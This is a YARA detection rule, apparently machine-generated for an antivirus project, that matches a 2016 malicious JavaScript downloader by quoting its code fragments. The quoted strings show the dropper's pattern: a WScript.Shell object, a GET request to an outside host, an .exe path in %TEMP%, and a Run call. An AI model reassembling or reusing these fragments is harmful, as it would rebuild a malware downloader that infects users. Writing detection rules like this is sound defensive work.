rule sig_20160330_0fba3d7f85d879c90dce6f36ca079559 {
  meta:
    description = "datamaliciousorder - file 20160330_0fba3d7f85d879c90dce6f36ca079559.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4c53ef4cacba18a75e8d3a86a0cee5c50af252a1ebc5c224943774213afeb833"

  strings:
    $s1  = "var Y1 = function LS() {return WScript[CP](\"WScript\"+\".Shell\");}(), R = 11;" fullword ascii
    $s2  = "function Y0(M, OA){TN = TN * 1; return M - OA;};" fullword ascii
    $s3  = "MB[T](\"GET\", \"http://arcfestoheni.hu/n3usad\", false);" fullword ascii
    $s4  = "if (MB[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function W() {return Y1[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"m1a6Ob1a09V4.ex\" + \"e\";};" fullword ascii
    $s6  = "function Q(){return TZ + \"\";};" fullword ascii
    $s7  = "function Y() {return ((E == true) && (E == N0)) ? 1 : TN;};" fullword ascii
    $s8  = "function GL(HS){Y1[\"Run\"](HS, TN, TN);};" fullword ascii
    $s9  = "function G(){return CP;};" fullword ascii
    $s10 = "function ZJ(N) {var L = (1, 2, 3, 4, 5, N); return L;};" fullword ascii
    $s11 = "function RX()" fullword ascii
    $s12 = "}while (S);" fullword ascii
    $s13 = "function SN(){return 22;};" fullword ascii
    $s14 = "var FP = new this[\"Date\"]();" fullword ascii
    $s15 = "return Y0(B, YT);" fullword ascii
    $s16 = "N0 = true; " fullword ascii
    $s17 = "var N0 = false;" fullword ascii
    $s18 = "E = true; " fullword ascii
    $s19 = "var HP = false;" fullword ascii
    $s20 = "} catch(T0){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}